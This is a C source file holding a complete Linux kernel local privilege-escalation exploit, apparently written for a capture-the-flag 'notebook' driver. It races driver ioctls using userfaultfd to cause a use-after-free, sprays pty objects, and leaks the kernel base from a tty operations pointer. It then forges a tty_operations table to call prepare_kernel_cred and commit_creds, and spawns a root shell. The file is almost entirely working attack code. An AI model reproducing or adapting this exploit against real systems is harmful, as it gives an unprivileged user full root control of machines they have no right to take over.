#define _GNU_SOURCE

#include <errno.h>

#include <fcntl.h>

#include <linux/fs.h>

#include <linux/userfaultfd.h>

#include <poll.h>

#include <pthread.h>

#include <sched.h>

#include <semaphore.h>

#include <stdint.h>

#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <sys/ioctl.h>

#include <sys/mman.h>

#include <sys/stat.h>

#include <sys/syscall.h>

#include <sys/types.h>

#include <sys/wait.h>

#include <unistd.h>

#include <pty.h>


#define CHECK(expr)		\
  if ((expr) == -1) {		\
    do {            		\
      perror(#expr);		\
      exit(EXIT_FAILURE);	\
    } while (0);		\
  }


const uint64_t v_prepare_kernel_cred = 0xFFFFFFFF810A9EF0;

const uint64_t v_prepare_creds = 0xFFFFFFFF810A9D60;

const uint64_t v_commit_creds = 0xFFFFFFFF810A9B40;

const uint64_t v_work_for_cpu_fn = 0xFFFFFFFF8109EB90;

const uint64_t v_pty_unix98_ops = 0xFFFFFFFF81E8E320;

const uint64_t kOffset_pty_unix98_ops = 0xe8e320;

const uint64_t kOffset_ptm_unix98_ops = 0xe8e440;


#define FAULT_PAGE 0x41410000

#define TARGET_SIZE 0x2e0

#define SUPER_BIG 0x2000

#define MAX_PTY_SPRAY 64

#define MAX_CATCHERS 8


char* stuck_forever = (char*)(FAULT_PAGE);

int fd;

char buffer[4096];


static void hexdump(void* data, size_t size) {

  unsigned char* _data = data;

  for (size_t i = 0; i < size; i++) {

    if (i && i % 16 == 0) putchar('\n');

    printf("%02x ", _data[i]);

  }

  putchar('\n');

}


struct note_userarg {

  uint64_t idx;

  uint64_t size;

  char *buf;

};


struct k_note {

  uint64_t mem;

  uint64_t size;

} note_in_kernel[16];


static void add_note(int idx, uint64_t size, char *buf) {

  struct note_userarg n;

  n.idx = idx;

  n.size = size;

  n.buf = buf;

  ioctl(fd, 0x100, &n);

}


static void del_note(int idx) {

  struct note_userarg n;

  n.idx = idx;

  ioctl(fd, 0x200, &n);

}


static void edit_note(int idx, uint64_t size, char *buf) {

  struct note_userarg n;

  n.idx = idx;

  n.size = size;

  n.buf = buf;

  ioctl(fd, 0x300, &n);

}


static void gift() {

  struct note_userarg n;

  n.buf = buffer;

  ioctl(fd, 0x64, &n);

  memcpy(note_in_kernel, buffer, sizeof(note_in_kernel));

}


static void debug_display_notes() {

  gift();

  printf("Notes:\n");

  for (int i = 0; i < 16; i++) {

    printf("%d:\tptr = %#lx, size = %#lx\n", i, note_in_kernel[i].mem,

           note_in_kernel[i].size);

  }

}


static void register_userfault() {

  struct uffdio_api ua;

  struct uffdio_register ur;

  pthread_t thr;

  uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);

  CHECK(uffd);

  ua.api = UFFD_API;

  ua.features = 0;

  CHECK(ioctl(uffd, UFFDIO_API, &ua));

  if (mmap((void *)FAULT_PAGE, 0x1000, PROT_READ | PROT_WRITE,

           MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1,

           0) != (void *)FAULT_PAGE) {

    perror("mmap");

    exit(EXIT_FAILURE);

  }

  ur.range.start = (uint64_t)FAULT_PAGE;

  ur.range.len = 0x1000;

  ur.mode = UFFDIO_REGISTER_MODE_MISSING;

  CHECK(ioctl(uffd, UFFDIO_REGISTER, &ur));

  // I’m not going to respond to userfault requests, let those kernel threads

  // stuck FOREVER!

}


/* ————- Legacy from 2017 —————– */

struct tty_driver {};

struct tty_struct {};

struct file {};

struct ktermios {};

struct termiox {};

struct serial_icounter_struct {};


struct tty_operations {

        struct tty_struct *        (*lookup)(struct tty_driver *, struct file *, int); /*     0     8 */

        int                        (*install)(struct tty_driver *, struct tty_struct *); /*     8     8 */

        void                       (*remove)(struct tty_driver *, struct tty_struct *); /*    16     8 */

        int                        (*open)(struct tty_struct *, struct file *); /*    24     8 */

        void                       (*close)(struct tty_struct *, struct file *); /*    32     8 */

        void                       (*shutdown)(struct tty_struct *); /*    40     8 */

        void                       (*cleanup)(struct tty_struct *); /*    48     8 */

        int                        (*write)(struct tty_struct *, const unsigned char  *, int); /*    56     8 */

        /* — cacheline 1 boundary (64 bytes) — */

        int                        (*put_char)(struct tty_struct *, unsigned char); /*    64     8 */

        void                       (*flush_chars)(struct tty_struct *); /*    72     8 */

        int                        (*write_room)(struct tty_struct *); /*    80     8 */

        int                        (*chars_in_buffer)(struct tty_struct *); /*    88     8 */

        int                        (*ioctl)(struct tty_struct *, unsigned int, long unsigned int); /*    96     8 */

        long int                   (*compat_ioctl)(struct tty_struct *, unsigned int, long unsigned int); /*   104     8 */

        void                       (*set_termios)(struct tty_struct *, struct ktermios *); /*   112     8 */

        void                       (*throttle)(struct tty_struct *); /*   120     8 */

        /* — cacheline 2 boundary (128 bytes) — */

        void                       (*unthrottle)(struct tty_struct *); /*   128     8 */

        void                       (*stop)(struct tty_struct *); /*   136     8 */

        void                       (*start)(struct tty_struct *); /*   144     8 */

        void                       (*hangup)(struct tty_struct *); /*   152     8 */

        int                        (*break_ctl)(struct tty_struct *, int); /*   160     8 */

        void                       (*flush_buffer)(struct tty_struct *); /*   168     8 */

        void                       (*set_ldisc)(struct tty_struct *); /*   176     8 */

        void                       (*wait_until_sent)(struct tty_struct *, int); /*   184     8 */

        /* — cacheline 3 boundary (192 bytes) — */

        void                       (*send_xchar)(struct tty_struct *, char); /*   192     8 */

        int                        (*tiocmget)(struct tty_struct *); /*   200     8 */

        int                        (*tiocmset)(struct tty_struct *, unsigned int, unsigned int); /*   208     8 */

        int                        (*resize)(struct tty_struct *, struct winsize *); /*   216     8 */

        int                        (*set_termiox)(struct tty_struct *, struct termiox *); /*   224     8 */

        int                        (*get_icount)(struct tty_struct *, struct serial_icounter_struct *); /*   232     8 */

        const struct file_operations  * proc_fops;       /*   240     8 */


        /* size: 248, cachelines: 4, members: 31 */

        /* last cacheline: 56 bytes */

};


struct tty_operations fake_ops;

/* ———————————————— */


sem_t edit_go;

void* victim_thread_edit(void* i) {

  sem_wait(&edit_go);

  edit_note((int)i, SUPER_BIG, stuck_forever);

  return NULL;

}


sem_t add_go;

void* victim_thread_add(void* i) {

  sem_wait(&add_go);

  add_note((int)i, 0x60, stuck_forever);

  return NULL;

}


int main(int argc, char *argv[]) {

  unsigned char cpu_mask = 0x01;

  sched_setaffinity(0, 1, &cpu_mask); // [1]

  char* name = calloc(1, 0x100);
  
  sem_init(&edit_go, 0, 0);

  sem_init(&add_go, 0, 0);

  register_userfault();


  fd = open("/dev/notebook", 2);

  CHECK(fd);


  for (int i = 0; i < MAX_CATCHERS; i++) {

    add_note(i, 0x60, name);

    edit_note(i, TARGET_SIZE, name);

  }

  puts("[=] Before dancing:");

  debug_display_notes();

  

  pthread_t thr;

  for (int i = 0; i < MAX_CATCHERS; i++) {

    if (pthread_create(&thr, NULL, victim_thread_edit, (void*)i)) {

      perror("pthread_create");

      exit(EXIT_FAILURE);

    }

  }

  for (int i = 0; i < MAX_CATCHERS; i++) sem_post(&edit_go);

  printf("[+] noteedit thread launched, wait for 1 second.\n");

  sleep(1);

  int pty_masters[MAX_PTY_SPRAY], pty_slaves[MAX_PTY_SPRAY];

  for (int i = 0; i < MAX_PTY_SPRAY; i++) {

    if (openpty(&pty_masters[i], &pty_slaves[i], NULL, NULL, NULL) == -1) {

      perror("openpty");

      exit(1);

    }

  }

  puts("[=] After noteedit:");

  debug_display_notes();


  for (int i = 0; i < MAX_CATCHERS; i++) {

    if (pthread_create(&thr, NULL, victim_thread_add, (void*)i)) {

      perror("pthread_create");

      exit(EXIT_FAILURE);

    }

  }

  for (int i = 0; i < MAX_CATCHERS; i++) sem_post(&add_go);

  printf("[+] noteadd thread launched, wait for 1 second.\n");

  sleep(1);

  puts("[=] After noteadd:");

  debug_display_notes();


  uint64_t kernel_slide = 0;

  uint64_t kernel_base = 0;

  int victim_idx = 0;

  // probe

  for (int i = 0; i < MAX_CATCHERS; i++) {

    printf("[=] Note %d:\n", i);

    read(fd, buffer, 0);

    hexdump(buffer, 0x60);

    uint64_t ops_ptr = *(uint64_t*)(buffer + 24);

    if ((ops_ptr & 0xfff) == (kOffset_ptm_unix98_ops & 0xfff)) {

      victim_idx = i;

      kernel_base = ops_ptr - kOffset_ptm_unix98_ops;

      kernel_slide = kernel_base - 0xFFFFFFFF81000000;

      break;

    }

  }

  if (!kernel_base) {

    printf("[-] Failed to leak kernel base\n");

    exit(EXIT_FAILURE);

  }

  printf("[+] kernel _text: %#lx\n", kernel_base);

  printf("[+] … or in other words, kernel slide: %#lx\n", kernel_slide);


  uint64_t prepare_kernel_cred = v_prepare_kernel_cred + kernel_slide;

  uint64_t prepare_creds = v_prepare_creds + kernel_slide;

  uint64_t commit_creds = v_commit_creds + kernel_slide;


  add_note(MAX_CATCHERS, 16, name);

  edit_note(MAX_CATCHERS, sizeof(struct tty_operations), name);

  memset(buffer, 0x41, sizeof(buffer));

  ((struct tty_operations*)buffer)->ioctl = v_work_for_cpu_fn + kernel_slide;

  write(fd, buffer, MAX_CATCHERS);


  gift();

  read(fd, buffer, victim_idx);

  uint64_t old_value_at_48 = *(uint64_t*)(buffer + 48);

  *(uint64_t*)(buffer + 24) = note_in_kernel[MAX_CATCHERS].mem;

  *(uint64_t*)(buffer + 32) = prepare_kernel_cred;

  *(uint64_t*)(buffer + 40) = 0;

  write(fd, buffer, victim_idx);


  // Boom

  for (int i = 0; i < MAX_PTY_SPRAY; i++) {

    ioctl(pty_masters[i], 233, 233);

  }


  read(fd, buffer, victim_idx);

  uint64_t new_value_at_48 = *(uint64_t*)(buffer + 48);

  printf("[+] prepare_creds() = %#lx\n", new_value_at_48);

  *(uint64_t*)(buffer + 32) = commit_creds;

  *(uint64_t*)(buffer + 40) = new_value_at_48;

  *(uint64_t*)(buffer + 48) = old_value_at_48;

  write(fd, buffer, victim_idx);


  // Boom

  for (int i = 0; i < MAX_PTY_SPRAY; i++) {

    ioctl(pty_masters[i], 233, 233);

  }


  printf("[=] getuid() = %d\n", getuid());


  if (getuid() == 0) {

    printf("[+] Pwned!\n");

    execlp("/bin/sh", "/bin/sh", NULL);

  }


  while (1);

  return 0;

}
